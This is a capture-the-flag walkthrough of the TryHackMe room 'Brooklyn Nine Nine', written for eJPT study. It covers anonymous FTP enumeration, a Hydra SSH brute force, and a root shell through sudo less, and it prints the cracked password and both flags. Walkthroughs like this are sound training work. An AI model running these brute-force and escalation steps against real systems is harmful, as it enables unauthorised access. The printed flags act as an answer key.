---
title: "Brooklyn Nine Nine"
date: 2026-01-21
draft: false
description: "Walkthrough of Brooklyn Nine Nine from TryHackMe. Anonymous FTP note revealing a user, SSH brute force with Hydra and privilege escalation with less via GTFOBins — eJPT preparation."
tags:
  [
    "walkthrough",
    "tryhackme",
    "ejpt",
    "linux",
    "ftp",
    "hydra",
    "ssh",
    "gtfobins",
    "privesc",
    "less",
  ]
categories: ["Walkthroughs"]
series: ["Road to eJPTv2"]
ShowToc: true
TocOpen: false
weight: 13
---

## Summary

**Brooklyn Nine Nine** is the thirteenth machine of the _Road to eJPTv2_ series. A TV-show themed machine with a classic attack flow: anonymous FTP exposing user information, SSH brute force with a weak password, and privilege escalation using `less` with sudo permissions — a simple but effective GTFOBins technique.

| Attribute      | Value                                                                          |
| -------------- | ------------------------------------------------------------------------------ |
| **Platform**   | TryHackMe                                                                      |
| **Difficulty** | Easy                                                                           |
| **OS**         | Linux (Ubuntu)                                                                 |
| **Room**       | [Brooklyn Nine Nine](https://tryhackme.com/room/brooklynninenine)              |
| **Skills**     | FTP Enum, SSH Brute Force, GTFOBins (less)                                     |

### Tools Used

- `nmap` — port scanning and version detection
- `ftp` — anonymous access and file download
- `hydra` — SSH brute force
- `gobuster` — web directory fuzzing
- `ssh` — access as jake
- `john` — hash cracking (unshadow)

### Solution Overview

1. **Recon:** nmap detects FTP with anonymous access, SSH and HTTP.
2. **Anonymous FTP:** `note_to_jake.txt` reveals `jake` has a weak password and mentions users `amy` and `holt`.
3. **SSH brute force:** Hydra with rockyou.txt cracks `jake`'s account with `987654321`.
4. **SSH access:** We connect as `jake` and enumerate the system.
5. **sudo -l:** `jake` can run `less` as root without a password.
6. **PrivEsc:** `sudo less /etc/profile` → `!/bin/sh` → root shell.
7. **Flags:** User flag at `/home/holt/user.txt`, root flag at `/root/root.txt`.

---

## Reconnaissance

### Ping

We verify connectivity and identify the OS by TTL:

```bash
ping -c 1 10.66.170.48
```

```
64 bytes from 10.66.170.48: icmp_seq=1 ttl=62 time=68.9 ms
```

TTL 62 → Linux (original value is 64, decremented through network hops).

### Nmap — Port Scan

```bash
nmap 10.201.43.213 -n -Pn -sS -p- --min-rate=5000 -oG allTCPports
```

```
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

### Nmap — Versions and Scripts

```bash
nmap 10.201.43.213 -n -Pn -sS -sVC -p21,22,80 --min-rate=5000 -oN brooklynscan.txt
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

Nmap detects anonymous FTP access with a visible `note_to_jake.txt` file — a direct pointer to the first user.

---

## FTP Enumeration

### Anonymous FTP

```bash
ftp 10.201.43.213 21
Name: anonymous
Password: [empty]
```

```
ftp> ls
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
ftp> get note_to_jake.txt
```

Contents of `note_to_jake.txt`:

```
From Amy,

Jake please change your password. It is too weak and holt will be mad
if someone hacks into the nine nine
```

> **Users identified:** `jake` (weak password), `amy`, `holt`

### Web Fuzzing — gobuster

```bash
gobuster dir -u http://10.201.43.213 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50
```

```
/server-status   (Status: 403)
```

No accessible directories — the web surface offers no attack vectors. We focus on SSH.

---

## Exploitation

### SSH Brute Force — Hydra

With the user list (`jake`, `amy`) and the knowledge that `jake` has a weak password, we launch Hydra against SSH:

```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://10.201.43.213
```

```
[22][ssh] host: 10.201.43.213   login: jake   password: 987654321
```

> **Credentials:** `jake:987654321`

### SSH Access as jake

```bash
ssh jake@10.201.43.213
jake@10.201.43.213's password: 987654321
```

```
jake@brookly_nine_nine:~$ id
uid=1000(jake) gid=1000(jake) groups=1000(jake)
```

We enumerate `/home` — confirming the three users mentioned in the note:

```bash
jake@brookly_nine_nine:/home$ ls
amy  holt  jake
```

---

## Post-Exploitation

### sudo -l

```bash
jake@brookly_nine_nine:~$ sudo -l
```

```
User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
```

`jake` can run `less` as root without a password — a documented privesc vector on GTFOBins.

---

## Privilege Escalation

### GTFOBins — sudo less

`less` allows executing system commands while it is active. When opened with `sudo`, any command executed from within runs as root.

```bash
jake@brookly_nine_nine:~$ sudo less /etc/profile
```

Inside `less`, we type the command to spawn a shell:

```
!/bin/sh
```

```
# whoami
root
```

Root shell obtained.

### Flags

**User flag** — in `holt`'s home directory:

```bash
root@brookly_nine_nine:/home/holt# cat user.txt
ee11cbb19052e40b07aac0ca060c23ee
```

> **User flag:** `ee11cbb19052e40b07aac0ca060c23ee`

**Root flag:**

```bash
root@brookly_nine_nine:/root# cat root.txt
63a9f0ea7bb98050796b649e85481845
```

> **Root flag:** `63a9f0ea7bb98050796b649e85481845`

---

## Lessons Learned

- **Internal notes on public services are free OSINT** — A text file on anonymous FTP revealed valid users and confirmed one had a weak password. Operational information should never be on publicly accessible services.
- **Simple numeric passwords are trivial with rockyou.txt** — `987654321` appears in the first pages of any standard wordlist. Always enforce strong password policies.
- **`sudo -l` before any other privesc technique** — It's the fastest check and frequently the most productive. Any binary with `NOPASSWD` in GTFOBins is a guaranteed escalation.
- **`less` is more dangerous than it looks** — A file reader with `sudo` allows executing arbitrary commands. The principle of least privilege applies to all binaries, not just the obvious ones.

### For the eJPT

| Concept                           | eJPT Relevance                                          |
| --------------------------------- | ------------------------------------------------------- |
| Anonymous FTP + file analysis     | Core network service enumeration in the exam            |
| SSH brute force with Hydra        | Standard access technique in the syllabus               |
| sudo + GTFOBins (less)            | Kernel-exploit-free privesc — very common               |

**Approximate completion time:** 20-30 minutes.

---

## References

- [Brooklyn Nine Nine — TryHackMe](https://tryhackme.com/room/brooklynninenine)
- [GTFOBins — less](https://gtfobins.github.io/gtfobins/less/)
